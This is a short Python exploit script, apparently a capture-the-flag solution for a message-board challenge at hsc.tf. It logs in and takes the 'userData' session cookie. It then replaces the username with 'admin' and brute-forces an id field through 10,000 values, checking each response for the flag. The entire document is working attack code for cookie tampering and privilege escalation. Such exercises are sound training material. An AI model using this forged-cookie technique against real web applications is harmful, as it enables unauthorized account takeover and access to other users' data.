#!/usr/bin/env python3
import requests


def exploit():
    target = 'https://message-board.hsc.tf'
    user = 'kupatergent'
    pw = 'gandal'
    with requests.Session() as sess:
        rsp = sess.post(target+'/login', data={'username':user,'password':pw})
        user_data = sess.cookies.get_dict()['userData']
        user_data = user_data.replace(user, 'admin')
        for admin_id in range(10000):
            fake = user_data.replace('972', str(admin_id))
            sess.cookies.set('userData', fake, domain=target.split('/')[-1])
            rsp = sess.get(target)
            print(sess.cookies)
            if 'flag{' in rsp.text:
                print(rsp.text)
                break

exploit()
